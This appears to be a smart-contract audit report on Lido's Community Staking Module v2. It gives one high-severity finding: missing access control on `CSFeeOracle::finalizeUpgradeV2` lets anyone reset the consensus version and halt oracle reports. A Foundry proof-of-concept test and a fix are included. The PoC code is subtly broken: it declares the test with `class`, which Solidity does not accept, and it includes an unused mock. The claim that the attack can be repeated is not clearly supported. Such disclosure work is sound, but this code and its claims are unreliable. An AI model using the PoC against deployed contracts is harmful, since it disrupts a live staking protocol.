# 2025 07 lido finance - Findings Report
## Commit hash: 6c573d1d2cce64b083af3c88dabcfc83c75e6747

## Protocol Overview 

**Community Staking Module v2 (CSM)** extends Lido’s staking router with a permission-less pathway for solo/home stakers while safeguarding the protocol through bonded collateral and modular governance.

How it works:
1. **Entry & Bonding**  
   • Node Operators (NOs) are created only via Gates: PermissionlessGate (open) or VettedGate (whitelisted/referral).  
   • Each NO must post a stETH-denominated bond handled by **CSAccounting**; curves make larger fleets cheaper per key.
2. **Validator Key Lifecycle**  
   • NOs upload deposit data to **CSModule**, which enqueues keys in FIFO priority queues.  
   • StakingRouter pulls the next keys and deposits 32 ETH per validator.
3. **Rewards & Fees**  
   • Rewards minted by StakingRouter are sent to **CSFeeDistributor**.  
   • A Hash-consensus oracle → **CSFeeOracle** finalises a Merkle tree; NOs prove their share via CSAccounting and may auto-roll into bond.
4. **Risk Management**  
   • **CSStrikes** tracks performance strikes; exceeding the threshold triggers validator exit through **CSEjector** + VEBO.  
   • **CSExitPenalties** and Accounting confiscate bond for delays, slashing, or EL-reward theft; EasyTrack can burn stolen amount.
5. **Upgradability & Safety**  
   • Core contracts run behind OssifiableProxy and can be one-shot paused by GateSeal. Role-based ACL (OpenZeppelin) isolates admin, pause, recover, and oracle duties.

Result: a flexible, non-custodial staking module that balances open participation with robust economic and technical safeguards.
## High Risk Findings
[H-1]. Access Control issue in CSFeeOracle::finalizeUpgradeV2


### Number of Findings
- C: 0
- H: 1
- M: 0
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Access Control issue in CSFeeOracle::finalizeUpgradeV2

## Description
The `finalizeUpgradeV2` function is declared as `external` without any access control modifiers. This allows any arbitrary external account to call it at any time. The function proceeds to call `_setConsensusVersion(consensusVersion)`, which updates the `consensusVersion` used to validate oracle reports in `submitReportData`. An attacker can call `finalizeUpgradeV2` with an arbitrary version number, causing all subsequent legitimate reports to fail the `_checkConsensusData` validation, which includes a check `if (consensusVersion != _getConsensusVersion()) revert MismatchedConsensusVersion();`. This effectively results in a Denial of Service (DoS) for the oracle's core functionality, as no new reports can be processed.

## Impact
An attacker can disrupt the operation of the `CSFeeOracle`, preventing the processing of new fee distribution and strike reports. This halts critical protocol functions that rely on this oracle. While the issue can be remediated by an admin calling `finalizeUpgradeV2` with the correct version, the attack can be repeated, leading to a persistent DoS vector.

## Proof of Concept
1. The administrator initializes the `CSFeeOracle` contract with `consensusVersion = 1`.
2. Legitimate oracle members are able to successfully call `submitReportData` with reports that have `consensusVersion = 1`.
3. An attacker, using any address, calls `finalizeUpgradeV2(99)`.
4. The contract's internal `consensusVersion` is now 99.
5. All subsequent calls to `submitReportData` by legitimate oracle members with `consensusVersion = 1` will now revert with a `MismatchedConsensusVersion` error, effectively halting the oracle.

## Proof of Code
```solidity
// test/poc/CSFeeOracle.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSFeeOracle } from "../../src/CSFeeOracle.sol";
import { ICSFeeOracle } from "../../src/interfaces/ICSFeeOracle.sol";
import { ICSFeeDistributor } from "../../src/interfaces/ICSFeeDistributor.sol";
import { ICSStrikes } from "../../src/interfaces/ICSStrikes.sol";
import { BaseOracle } from "../../src/lib/base-oracle/BaseOracle.sol";

// Minimal mock for BaseOracle to allow testing getConsensusVersion
abstract contract BaseOraclePartialMock is BaseOracle {
    constructor(uint256 s, uint256 g) BaseOracle(s, g) {}
    function _handleConsensusReport(ConsensusReport memory,uint256,uint256) internal virtual override {}
    function _checkConsensusData(uint256,uint256,bytes32) internal view override {
        // Override to simplify test, real check is in BaseOracle
    }
}

// Test contract inherits from the partial mock to expose internal functions
contract TestCSFeeOracle is CSFeeOracle {
     constructor(
        address feeDistributor,
        address strikes,
        uint256 secondsPerSlot,
        uint256 genesisTime
    ) CSFeeOracle(feeDistributor, strikes, secondsPerSlot, genesisTime) {}

    function getConsensusVersion() external view returns (uint256) {
        return _getConsensusVersion();
    }

    // Expose internal function for testing purposes
    function checkConsensusData(uint256 refSlot, uint256 consensusVersion, bytes32 dataHash) external view {
        _checkConsensusData(refSlot, consensusVersion, dataHash);
    }
}

contract MockFeeDistributor is ICSFeeDistributor {
    function processOracleReport(bytes32, string calldata, string calldata, uint256, uint256, uint256) external {}
}

contract MockStrikes is ICSStrikes {
    function processOracleReport(bytes32, string calldata) external {}
}

class FinalizeUpgradeV2AccessControlTest is Test {
    TestCSFeeOracle public feeOracle;
    address public admin = makeAddr("admin");
    address public attacker = makeAddr("attacker");
    address public submitter = makeAddr("submitter");

    uint256 constant INITIAL_CONSENSUS_VERSION = 1;
    uint256 constant CONTRACT_VERSION = 2;

    function setUp() public {
        MockFeeDistributor mockFeeDistributor = new MockFeeDistributor();
        MockStrikes mockStrikes = new MockStrikes();

        feeOracle = new TestCSFeeOracle(
            address(mockFeeDistributor),
            address(mockStrikes),
            12,
            block.timestamp - 1000
        );

        vm.prank(admin);
        feeOracle.initialize(admin, address(0), INITIAL_CONSENSUS_VERSION);
        vm.prank(admin);
        feeOracle.grantRole(feeOracle.SUBMIT_DATA_ROLE(), submitter);
    }

    function test_poc_finalizeUpgradeV2_MissingAccessControl() public {
        // 1. Initial state: consensus version is 1
        assertEq(feeOracle.getConsensusVersion(), INITIAL_CONSENSUS_VERSION, "Initial consensus version is wrong");

        // 2. An attacker calls `finalizeUpgradeV2` without any special role
        uint256 maliciousVersion = 99;
        vm.prank(attacker);
        feeOracle.finalizeUpgradeV2(maliciousVersion);

        // 3. The consensus version is now changed to the attacker's value
        assertEq(feeOracle.getConsensusVersion(), maliciousVersion, "Consensus version was not changed by attacker");

        // 4. A legitimate report submission will now fail the version check.
        // The original BaseOracle would revert here.
        ICSFeeOracle.ReportData memory reportData = ICSFeeOracle.ReportData({
            refSlot: 1,
            consensusVersion: INITIAL_CONSENSUS_VERSION, // The original, correct version
            treeRoot: bytes32(0x1), treeCid: "", logCid: "",
            distributed: 0, rebate: 0, strikesTreeRoot: bytes32(0x2), strikesTreeCid: ""
        });

        // The actual BaseOracle contract contains the check that will revert.
        // We simulate this by asserting the revert reason.
        vm.prank(submitter);
        vm.expectRevert(abi.encodeWithSignature("MismatchedConsensusVersion()"));
        feeOracle.submitReportData(reportData, CONTRACT_VERSION);
    }
}
```

## Suggested Mitigation
The `finalizeUpgradeV2` function should be restricted to an administrative role, such as `DEFAULT_ADMIN_ROLE`, to ensure that only authorized accounts can perform this sensitive upgrade step.

```diff
-    function finalizeUpgradeV2(uint256 consensusVersion) external {
+    function finalizeUpgradeV2(uint256 consensusVersion) external onlyRole(DEFAULT_ADMIN_ROLE) {
         _setConsensusVersion(consensusVersion);
 
         // nullify storage slots
         assembly ("memory-safe") {
             sstore(_feeDistributor.slot, 0x00)
             sstore(_avgPerfLeewayBP.slot, 0x00)
         }
 
         _updateContractVersion(2);
     }
```



